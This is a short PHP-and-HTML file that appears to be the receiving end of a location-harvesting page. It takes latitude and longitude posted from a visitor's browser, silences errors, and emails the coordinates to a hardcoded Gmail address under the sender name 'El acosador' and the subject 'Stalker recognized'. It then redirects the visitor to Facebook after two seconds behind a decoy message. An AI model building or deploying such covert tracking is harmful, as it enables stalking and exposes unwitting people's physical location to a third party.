<?php
error_reporting(0);
$nombre = "El acosador";
$mail = "66547381+giova-crypto@users.noreply.github.com";

$header = 'From: ' . $mail ."\r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";
$mensaje = "Este mensaje fue enviado por " . $nombre . " \r\n";
//variable longitud
$long = $_POST['long'];
//variable latitud
$lat = $_POST['lat'];
$mensaje .= "longitud: ".$long. " \r\n";
$mensaje .= "latitud: ".$lat. " \r\n";
$mensaje .= "Enviado el " . date('d/m/Y', time());

$para = 'lukefest6@gmail.com';
$asunto = 'Stalker recognized';

mail($para, $asunto, utf8_decode($mensaje), $header);

echo 'mensaje enviado correctamente\n' ;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="css/reset.css" rel="stylesheet" style="text/css" />
    <link href="css/main.css" rel="stylesheet" style="text/css" media="screen" />
    <META HTTP-EQUIV="REFRESH" CONTENT="2;URL=http://www.facebook.com/">
</head>
<body>
Esta página cambia en 2 segundos por la portada de DesarrolloWeb.com
</body>
</html>
